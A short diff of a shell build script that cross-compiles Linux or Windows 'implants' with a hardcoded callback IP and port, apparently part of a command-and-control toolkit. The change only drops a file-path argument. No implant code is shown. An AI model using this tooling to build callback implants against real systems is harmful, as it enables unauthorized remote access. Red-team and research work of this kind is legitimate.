@@ -3,11 +3,10 @@
 OS=$1
 IP=$2
 PORT=$3
-ID_PATH=$4
 
 
 if [ -z "$OS" ] || [ -z "$IP" ] || [ -z "$PORT" ]; then
-    echo "Usage: $0 <linux/windows> <ip> <port> <path/to/store/id>"
+    echo "Usage: $0 <linux/windows> <ip> <port> "
     exit 1
 fi
 
@@ -25,7 +24,7 @@ elif [ $OS == "windows" ]; then
     i686-w64-mingw32-g++ -Wall -O2 -ffunction-sections -fdata-sections -fmerge-all-constants \
                         -static-libstdc++ -static-libgcc ./includes/cJSON/cJSON.c \
                         $src -o $win_out -lws2_32 -lsecur32 \
-                        -DADDR="\"$IP\"" -DPORT=$PORT #-Dfile_path=$ID_PATH
+                        -DADDR="\"$IP\"" -DPORT=$PORT 
     echo "[+] WINDOWS IMPLANT DONE\n"
     exit 1
 fi
